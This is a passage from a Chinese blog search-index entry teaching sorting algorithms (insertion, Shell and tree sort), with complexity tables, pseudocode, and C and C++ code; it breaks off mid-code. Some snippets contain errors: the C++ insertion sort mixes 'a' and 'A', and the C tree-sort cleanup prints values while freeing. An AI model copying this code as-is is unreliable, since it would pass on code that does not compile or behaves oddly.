<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>排序</title>
    <url>/Algorithm/Sort.html</url>
    <content><![CDATA[<p>各种排序算法的复杂度是不同的，对于小数据集，简单算法通常执行的更好，数据集越大，复杂算法的优势才会越明显。</p>
<span id="more"></span>

<p><strong>关键属性</strong>：比较次数与移动次数。</p>
<ul>
<li>如果比较的是整数与字符，代价不大。如果是数字数组或者字符串，代价显著提高；</li>
<li>如果移动的是结构，代价也会非常突出。</li>
</ul>
<p><strong>时间复杂度</strong>：</p>
<ul>
<li>最好情况（通常数据已排序）</li>
<li>最坏情况（数据按相反顺序排列）</li>
<li>平均情况（数据顺序是随机的）</li>
</ul>
<p><strong>空间复杂度</strong>：</p>
<ul>
<li>运行过程占用的临时空间的大小。如果输入数据中仅有常数个元素需要在排序过程中存储在数组之外，则称排序算法是<strong>原址的（in place）</strong>。</li>
</ul>
<p><strong>稳定性</strong>：当待排序的数据集中含有多个相同的元素，经过排序后，如果这些相同元素的相对位置保持不变，则称这种排序算法是稳定的。</p>
<h1 id="比较类"><a href="#比较类" class="headerlink" title="比较类"></a>比较类</h1><h2 id="插入类"><a href="#插入类" class="headerlink" title="插入类"></a>插入类</h2><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><p>将无序数据依次插入有序集中。每次都从有序集的尾部开始比较并后移有序集中的元素，直至找到合适位置后插入数据。</p>
<table>
<thead>
<tr>
<th align="left">name</th>
<th align="left">best</th>
<th align="left">average</th>
<th align="left">worst</th>
<th align="left">memory</th>
<th align="left">stable</th>
<th align="left">method</th>
<th align="left">notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">insertsort</td>
<td align="left">n</td>
<td align="left">$n^2$</td>
<td align="left">$n^2$</td>
<td align="left">1</td>
<td align="left">yes</td>
<td align="left">插入</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="insertsort"><ul class="nav-tabs"><li class="tab active"><a href="#insertsort-1">pseudo</a></li><li class="tab"><a href="#insertsort-2">c</a></li><li class="tab"><a href="#insertsort-3">c++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="insertsort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">insertsort(a[<span class="type">n</span>])</span><br><span class="line">    <span class="comment"># 从第2个元素开始</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">2</span> to n</span><br><span class="line">        <span class="comment"># 暂存待排序元素</span></span><br><span class="line">        tmp = a[<span class="type">i</span>]</span><br><span class="line">        <span class="comment"># 向前遍历，依次将大于待排序元素的值后移一位</span></span><br><span class="line">        <span class="keyword">for</span> j = i to <span class="number">2</span> and tmp &lt; a[<span class="type">j</span>-<span class="number">1</span>]</span><br><span class="line">            a[<span class="type">j</span>] = a[<span class="type">j</span>-<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># 将待排序元素放置在正确位置</span></span><br><span class="line">        a[<span class="type">j</span>] = tmp</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="insertsort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insertsort</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> tmp = a[i];</span><br><span class="line">        <span class="keyword">for</span> (j = i; j &gt; <span class="number">0</span> &amp;&amp; tmp &lt; a[j<span class="number">-1</span>]; j--) &#123;</span><br><span class="line">            a[j] = a[j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        a[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="insertsort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insertsort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; a.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="type">int</span> tmp = a[i];</span><br><span class="line">        <span class="type">int</span> j = i;</span><br><span class="line">        <span class="keyword">for</span> (; j &gt; <span class="number">0</span> &amp;&amp; tmp &lt; A[j<span class="number">-1</span>]; j--) &#123;</span><br><span class="line">            A[j] = A[j<span class="number">-1</span>];</span><br><span class="line">        &#125;           </span><br><span class="line">        A[j] = tmp; </span><br><span class="line">    &#125;         </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><p>1959年<code>Donald L. Shell</code>设计而得名，此时时间复杂度为$N^2$。<br>1973年<code>Donald Ervin Knuth</code>改良增量值为$3^k-1 \over 2$，对应具体值为<code>1,4,13,40,121</code>，时间复杂度为$N^3 \over 2$。<br>1982年<code>Sedgewick</code>改良增量值为$4^k+3·2^{k-1}+1$，对应具体值为<code>1,8,23,77,281</code>，时间复杂度为$N^4 \over 3$。<br>希尔排序可看成对<a href="#%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F"><strong>插入排序</strong></a>的一种改进。通过增量将数据分割成多个子数据，子数据的数量等于增量大小，子数据的相邻元素间隔也为增量大小，使用简单算法（多为插入排序）对各子数据进行排序，使得数据愈加有序。当增量减小到1时，等同于使用基础算法排序少量乱序的数据。</p>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ShellSort</td>
<td align="left">$n\log n$</td>
<td align="left">$n^{4 \over 3}$</td>
<td align="left">$n^{3 \over 2}$</td>
<td align="left">1</td>
<td align="left">no</td>
<td align="left">插入</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="shellsort"><ul class="nav-tabs"><li class="tab active"><a href="#shellsort-1">Pseudo</a></li><li class="tab"><a href="#shellsort-2">C</a></li><li class="tab"><a href="#shellsort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="shellsort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">ShellSort(A[<span class="type">n</span>])</span><br><span class="line">    <span class="comment"># 计算增值序列</span></span><br><span class="line">    m: n/<span class="number">3</span></span><br><span class="line">    G[<span class="type">m</span>]: &#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">40</span>,<span class="number">121</span>,...&#125; (<span class="built_in">h</span>=<span class="number">3</span><span class="built_in">h</span>+<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 从最大的增量值开始排序子数组</span></span><br><span class="line">    <span class="keyword">for</span> i = m to <span class="number">1</span></span><br><span class="line">        <span class="built_in">h</span> = G[<span class="type">i</span>]</span><br><span class="line">        <span class="comment"># 依次排序当前增量对应的各子数组（此时j对应子数组的第2个元素）</span></span><br><span class="line">        <span class="keyword">for</span> j = <span class="built_in">h</span> to <span class="number">2</span>*<span class="built_in">h</span><span class="literal">-1</span></span><br><span class="line">            <span class="comment"># 排序当前子数组（常用插入排序，因此从第2个元素开始）</span></span><br><span class="line">            <span class="keyword">for</span> k = j to n</span><br><span class="line">                <span class="comment"># 暂存待排序元素</span></span><br><span class="line">                tmp = A[<span class="type">k</span>]</span><br><span class="line">                <span class="comment"># 向前遍历，依次将大于待排序元素的值后移一位</span></span><br><span class="line">                l = k</span><br><span class="line">                <span class="keyword">for</span> l<span class="literal">-h</span> &gt;= <span class="number">1</span> and tmp &lt; A[<span class="type">l</span>-<span class="type">h</span>]</span><br><span class="line">                    A[<span class="type">l</span>] = A[<span class="type">l</span>-<span class="type">h</span>]</span><br><span class="line">                    l = l - <span class="built_in">h</span></span><br><span class="line">                <span class="comment"># 将待排序元素放置在正确位置</span></span><br><span class="line">                A[<span class="type">l</span>] = tmp</span><br><span class="line">                <span class="comment"># 选择下一个待排序元素</span></span><br><span class="line">                k = k + <span class="built_in">h</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="shellsort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ShellSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h, i, j, k, l, tmp;</span><br><span class="line">    <span class="type">int</span> *G = (<span class="type">int</span>*)<span class="built_in">malloc</span>(n/<span class="number">3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">for</span> (h = <span class="number">1</span>, i = <span class="number">0</span>; h &lt; n; h = <span class="number">3</span>*h+<span class="number">1</span>) &#123;</span><br><span class="line">        G[i++] = h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = i<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        h = G[i];</span><br><span class="line">        <span class="keyword">for</span> (j = h; j &lt; <span class="number">2</span>*h; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = j; k &lt; n; k += h) &#123;</span><br><span class="line">                tmp = A[k];</span><br><span class="line">                l = k;</span><br><span class="line">                <span class="keyword">for</span> (; l-h &gt;= <span class="number">0</span> &amp;&amp; tmp &lt; A[l-h]; l -= h) &#123;</span><br><span class="line">                    A[l] = A[l-h];</span><br><span class="line">                &#125;</span><br><span class="line">                A[l] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(G);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="shellsort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShellSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; G;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> h = <span class="number">1</span>; h &lt; n; h = <span class="number">3</span>*h+<span class="number">1</span>) &#123;</span><br><span class="line">        G.<span class="built_in">push</span>(h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!G.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> h = G.<span class="built_in">top</span>();</span><br><span class="line">        G.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = h; i &lt; <span class="number">2</span>*h; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="type">int</span> tmp = A[j];</span><br><span class="line">                <span class="type">int</span> k = j;</span><br><span class="line">                <span class="keyword">for</span> (; k-h &gt;= <span class="number">0</span> &amp;&amp; tmp &lt; A[k-h]; k -= h) &#123;</span><br><span class="line">                    A[k] = A[k-h];</span><br><span class="line">                &#125;</span><br><span class="line">                A[k] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="树排序"><a href="#树排序" class="headerlink" title="树排序"></a>树排序</h3><p>树排序是将输入数据依次<strong>插入</strong><a href="/DataStructure/Tree#%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91"><strong>二叉搜索树</strong></a>（<code>BST, Binary Search Tree</code>）后，再通过<strong>中序遍历</strong>取回原始数据中以得到有序数据。此方法需要使用辅助存储, 不是原址排序的。</p>
<p>对于输入数据<code>A[n]</code>，排序前预先定义二叉搜索树<code>BST</code>对象，并实现插入<code>insert</code>和中序遍历<code>inorder</code>方法。 步骤如下：</p>
<ol>
<li>遍历<code>A[n]</code>，依次将<code>A[i]</code>插入到<code>BST</code>中以构建树；</li>
<li>中序遍历<code>BST</code>，按照从小到大的顺序依次取回元素到<code>A[n]</code>中；</li>
<li>清空BST，释放自身以及所有节点存储空间。</li>
</ol>
<p>二叉搜索树是否为平衡树，取决于输入数据的插入顺序。最差情况下，树退化为链表。</p>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">TreeSort</td>
<td align="left">$n\log n$</td>
<td align="left">$n\log n$</td>
<td align="left">$n\log n(balanced)$ $n^2(unbalanced)$</td>
<td align="left">n</td>
<td align="left">yes</td>
<td align="left">插入</td>
<td align="left">使用二叉搜索树时</td>
</tr>
</tbody></table>
<div class="tabs" id="treesort"><ul class="nav-tabs"><li class="tab active"><a href="#treesort-1">Pseudo-R</a></li><li class="tab"><a href="#treesort-2">Pseudo-I</a></li><li class="tab"><a href="#treesort-3">C</a></li><li class="tab"><a href="#treesort-4">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="treesort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">BSNode</span><br><span class="line">    e: value of node</span><br><span class="line">    L: left subtree</span><br><span class="line">    <span class="built_in">R</span>: right subtree</span><br><span class="line">BSTree</span><br><span class="line">    root: BSNode，=nul</span><br><span class="line">    <span class="comment"># 插入BST（递归实现）</span></span><br><span class="line">    Insert(x, e)</span><br><span class="line">        <span class="keyword">if</span> x.NotExist</span><br><span class="line">            x = &#123;e,nul,nul&#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">if</span> x.e &gt; e</span><br><span class="line">                Insert(x.L, e)</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                Insert(x.R, e)</span><br><span class="line">    <span class="comment"># 中序遍历（递归实现）</span></span><br><span class="line">    Inorder(x, A)</span><br><span class="line">        <span class="keyword">if</span> x.Exist</span><br><span class="line">            Inorder(x.L, A)</span><br><span class="line">            A &lt;- x.e</span><br><span class="line">            Inorder(x.R, A)</span><br><span class="line">    <span class="comment"># 清空BST（递归实现）</span></span><br><span class="line">    <span class="built_in">Clear</span>(x)</span><br><span class="line">        <span class="keyword">if</span> x.Exist</span><br><span class="line">            <span class="keyword">if</span> x.L.Exist</span><br><span class="line">                <span class="built_in">Clear</span>(x.L)</span><br><span class="line">            <span class="keyword">if</span> x.R.Exist</span><br><span class="line">                <span class="built_in">Clear</span>(x.R)</span><br><span class="line">            delete(x)</span><br><span class="line">TreeSort(A[<span class="type">n</span>])</span><br><span class="line">    T: BSTree</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> to n</span><br><span class="line">        T.Insert(T.root, A[<span class="type">i</span>])</span><br><span class="line">    A = T.Inorder(T.root)</span><br><span class="line">    T.Clear(T.root)</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="treesort-2"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">BSNode</span><br><span class="line">    e: value of node</span><br><span class="line">    L: left subtree</span><br><span class="line">    <span class="built_in">R</span>: right subtree</span><br><span class="line">BSTree</span><br><span class="line">    root: BSNode，=nul</span><br><span class="line">    <span class="comment"># 插入BST（迭代实现）</span></span><br><span class="line">    Insert(e)</span><br><span class="line">        z: BSNode, =&#123;e,nul,nul&#125;</span><br><span class="line">        y: BSNode, =nul</span><br><span class="line">        x: BSNode, =root</span><br><span class="line">        <span class="comment"># 找到最接近e的叶子节点y</span></span><br><span class="line">        <span class="keyword">while</span> x.Exist</span><br><span class="line">            y = x</span><br><span class="line">            <span class="keyword">if</span> x.e &gt; z.e</span><br><span class="line">                x = x.L</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                x = x.R</span><br><span class="line">        <span class="keyword">if</span> y.NotExist</span><br><span class="line">            <span class="comment"># 将e插入root</span></span><br><span class="line">            root = z</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment"># 将e插入到y的子树中</span></span><br><span class="line">            <span class="keyword">if</span> y.e &gt; z.e</span><br><span class="line">                y.L = z</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                y.R = z</span><br><span class="line">    <span class="comment"># 中序遍历（迭代实现）</span></span><br><span class="line">    Inorder(A)</span><br><span class="line">        S: stack&lt;BSNode&gt;</span><br><span class="line">        x: BSNode, =root</span><br><span class="line">        <span class="comment"># 遍历树中所有的右子树节点（包括根节点）</span></span><br><span class="line">        <span class="keyword">while</span> x.Exist</span><br><span class="line">            <span class="comment"># 自顶向左遍历，依次把右子树和当前节点入栈，直至最左边节点入栈完成</span></span><br><span class="line">            <span class="keyword">while</span> x.Exist</span><br><span class="line">                <span class="keyword">if</span> x.R.Exist</span><br><span class="line">                    S &lt;- x.R</span><br><span class="line">                S &lt;- x</span><br><span class="line">                x = x.L</span><br><span class="line">            <span class="comment"># 从最左边节点开始向顶出栈，直至第一个带右子树的节点出栈完成</span></span><br><span class="line">            x &lt;- S</span><br><span class="line">            <span class="keyword">while</span> S.NotEmpty and x.R.NotExist</span><br><span class="line">                A &lt;- x.e</span><br><span class="line">                x &lt;- S</span><br><span class="line">            A &lt;- x.e</span><br><span class="line">            <span class="comment"># 栈为空，说明自顶向左的入栈的所有节点均没有右子树，即遍历完成</span></span><br><span class="line">            <span class="keyword">if</span> S.Empty</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 将当前节点的右子树节点出栈</span></span><br><span class="line">            x &lt;- S</span><br><span class="line">    <span class="comment"># 清空BST（迭代实现）</span></span><br><span class="line">    <span class="built_in">Clear</span>()</span><br><span class="line">        S: stack&lt;BSNode&gt;</span><br><span class="line">        x: BSNode, =root</span><br><span class="line">        <span class="keyword">while</span> x.Exist</span><br><span class="line">            <span class="keyword">if</span> x.R.Exist</span><br><span class="line">                S &lt;- x.R</span><br><span class="line">            <span class="keyword">if</span> x.L.Exist</span><br><span class="line">                S &lt;- x.L</span><br><span class="line">            delete(x)</span><br><span class="line">            <span class="keyword">if</span> S.Empty</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            x &lt;- S</span><br><span class="line">TreeSort(A[<span class="type">n</span>])</span><br><span class="line">    T: BSTree</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> to n</span><br><span class="line">        T.Insert(A[<span class="type">i</span>])</span><br><span class="line">    A = T.Inorder()</span><br><span class="line">    T.Clear()</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="treesort-3"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BSNode</span> <span class="title">BSNode</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BSTree</span> <span class="title">BSTree</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BSNode</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    BSNode *L;</span><br><span class="line">    BSNode *R;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BSTree</span> &#123;</span></span><br><span class="line">    BSNode *root;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">BSTInsert_i</span><span class="params">(BSTree *T, <span class="type">int</span> e)</span> &#123;</span><br><span class="line">    BSNode *z = <span class="literal">NULL</span>;</span><br><span class="line">    BSNode *y = <span class="literal">NULL</span>;</span><br><span class="line">    BSNode *x = T-&gt;root;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">NULL</span> != x) &#123;</span><br><span class="line">        y = x;</span><br><span class="line">        <span class="keyword">if</span> (x-&gt;e &gt; e)</span><br><span class="line">            x = x-&gt;L;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            x = x-&gt;R;</span><br><span class="line">    &#125;</span><br><span class="line">    z = (BSNode*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BSNode));</span><br><span class="line">    z-&gt;e = e;</span><br><span class="line">    z-&gt;L = z-&gt;R = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == y) &#123;</span><br><span class="line">        T-&gt;root = z;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (y-&gt;e &gt; e)</span><br><span class="line">            y-&gt;L = z;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            y-&gt;R = z;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">BSTInsert_r</span><span class="params">(BSNode **x, <span class="type">int</span> e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == x || <span class="literal">NULL</span> == (*x)) &#123;</span><br><span class="line">        (*x) = (BSNode*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BSNode));</span><br><span class="line">        (*x)-&gt;e = e;</span><br><span class="line">        (*x)-&gt;L = (*x)-&gt;R = <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*x)-&gt;e &gt; e)</span><br><span class="line">            BSTInsert_r(&amp;(*x)-&gt;L, e);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            BSTInsert_r(&amp;(*x)-&gt;R, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">BSTInorder_r</span><span class="params">(<span class="type">const</span> BSNode *x, <span class="type">int</span> A[], <span class="type">int</span> *i)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != x) &#123;</span><br><span class="line">        BSTInorder_r(x-&gt;L, A, i);</span><br><span class="line">        A[(*i)++] = x-&gt;e;</span><br><span class="line">        BSTInorder_r(x-&gt;R, A, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">BSTClear_r</span><span class="params">(BSNode *x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != x) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != x-&gt;L)</span><br><span class="line">            BSTClear_r(x-&gt;L);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != x-&gt;R)</span><br><span class="line">            BSTClear_r(x-&gt;R);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&#125;&quot;</span>, x-&gt;e);</span><br><span class="line">        <span class="built_in">free</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">TreeSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, t = <span class="number">0</span>;</span><br><span class="line">    BSTree *T = (BSTree*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BSTree));</span><br><span class="line">    T-&gt;root = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">switch</span> (t) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">                BSTInsert_r(&amp;T-&gt;root, A[i]);</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            BSTInorder_r(T-&gt;root, A, &amp;j);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">                BSTInsert_i(T, A[i]);</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            BSTInorder_r(T-&gt;root, A, &amp;j);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    BSTClear_r(T-&gt;root);</span><br><span class="line">    <span class="built_in">free</span>(T);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="treesort-4"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BSNode</span> &#123;</span><br><span class="line">    <span class="keyword">typedef</span> shared_ptr&lt;BSNode&gt; PBSNode;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">BSNode</span>(<span class="type">int</span> e, PBSNode L = <span class="literal">nullptr</span>, PBSNode R = <span class="literal">nullptr</span>)</span><br><span class="line">        : <span class="built_in">e</span>(e), <span class="built_in">L</span>(L), <span class="built_in">R</span>(R) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">auto</span>&amp; <span class="title">getE</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> e; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">auto</span>&amp; <span class="title">getL</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> L; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">auto</span>&amp; <span class="title">getR</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> R; &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    PBSNode L;</span><br><span class="line">    PBSNode R;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BSTree</span> &#123;</span><br><span class="line">    <span class="keyword">typedef</span> shared_ptr&lt;BSNode&gt; PBSNode;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">auto</span>&amp; <span class="title">getRoot</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> root; &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insert_R</span><span class="params">(PBSNode&amp; x, <span class="type">int</span> e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!x) &#123;</span><br><span class="line">            x = <span class="built_in">make_shared</span>&lt;BSNode&gt;(e);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;<span class="built_in">getE</span>() &gt; e)</span><br><span class="line">                <span class="built_in">insert_R</span>(x-&gt;<span class="built_in">getL</span>(), e);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">insert_R</span>(x-&gt;<span class="built_in">getR</span>(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">inorder_R</span><span class="params">(PBSNode x, vector&lt;<span class="type">int</span>&gt;&amp; A, <span class="type">int</span>&amp; i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x) &#123;</span><br><span class="line">            <span class="built_in">inorder_R</span>(x-&gt;<span class="built_in">getL</span>(), A, i);</span><br><span class="line">            A[i++] = x-&gt;<span class="built_in">getE</span>();</span><br><span class="line">            <span class="built_in">inorder_R</span>(x-&gt;<span class="built_in">getR</span>(), A, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">clear_R</span><span class="params">(PBSNode x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x) &#123;</span><br><span class="line">            <span class="built_in">clear_R</span>(x-&gt;<span class="built_in">getL</span>());</span><br><span class="line">            <span class="built_in">clear_R</span>(x-&gt;<span class="built_in">getR</span>());</span><br><span class="line">            x = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insert_I</span><span class="params">(<span class="type">int</span> e)</span> </span>&#123;</span><br><span class="line">        PBSNode 